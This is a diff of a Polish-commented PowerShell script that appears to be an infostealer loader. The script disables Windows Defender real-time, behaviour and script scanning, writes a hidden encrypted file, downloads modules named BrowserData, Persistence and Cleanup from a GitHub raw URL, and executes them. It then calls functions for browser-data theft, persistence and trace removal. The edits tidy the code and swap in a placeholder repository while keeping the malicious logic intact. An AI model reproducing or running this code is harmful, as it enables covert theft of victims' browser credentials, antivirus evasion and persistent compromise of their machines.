@@ -1,12 +1,6 @@
 #region Inicjalizacja
 $ErrorActionPreference = 'SilentlyContinue'
-$repoUrl = "https://raw.githubusercontent.com/dfassdaopiju/XzxX/refs/heads/main/"
-$payloadName = "payload.ps1"
-
-# W payload.ps1 przed wywołaniem modułów:
-$sqliteDllUrl = "$repoUrl/System.Data.SQLite.dll"
-$sqliteDllPath = "E:\System.Data.SQLite.dll"
-(New-Object Net.WebClient).DownloadFile($sqliteDllUrl, $sqliteDllPath)
+$repoUrl = "https://raw.githubusercontent.com/TwojeRepo/main/"
 
 # Funkcja do szyfrowania danych
 function Encrypt-Data {
@@ -17,9 +11,9 @@ function Encrypt-Data {
 
 #region Mechanizmy Ochronne
 # Tymczasowe wyłączenie Windows Defender
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 
 #region Główna Logika
 try {
@@ -30,7 +24,7 @@ try {
     $encryptedData | Out-File -FilePath $secureFilePath
     attrib +s +h $secureFilePath
 
-    # Pobranie i wykonanie dodatkowych modułów
+    # Pobranie i wykonanie modułów
     $modules = @('BrowserData.ps1', 'Persistence.ps1', 'Cleanup.ps1')
     foreach ($module in $modules) {
         $moduleUrl = "$repoUrl$module"
@@ -40,7 +34,7 @@ try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         (New-Object Net.WebClient).DownloadFile($moduleUrl, $modulePath)
         
-        # Wykonaj moduł w obecnym zakresie (funkcje będą dostępne)
+        # Wykonaj moduł w obecnym zakresie
         . $modulePath
     }
     
@@ -49,10 +43,13 @@ try {
     Set-Persistence
     Invoke-Cleanup
 }
+catch {
+    $_ | Out-File "E:\ErrorLog_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
+}
 finally {
     # Przywrócenie ustawień Defender
-    Set-MpPreference -DisableRealtimeMonitoring $false
-    Set-MpPreference -DisableBehaviorMonitoring $false
-    Set-MpPreference -DisableScriptScanning $false
+    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+    Set-MpPreference -DisableScriptScanning $false -ErrorAction SilentlyContinue
 }
 #endregion
